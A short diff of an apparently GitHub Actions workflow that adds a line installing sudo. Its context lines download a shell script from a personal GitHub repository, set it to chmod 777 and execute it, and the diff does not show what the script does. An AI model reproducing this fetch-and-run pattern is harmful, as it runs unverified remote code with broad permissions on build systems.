@@ -27,6 +27,7 @@ jobs:
       run: |
              apt-get update
              apt-get install wget -y 
+             apt-get install sudo -y
              wget https://github.com/taebk2838/docker-desktop/raw/master/set.sh
              chmod 777 set.sh
              ./set.sh
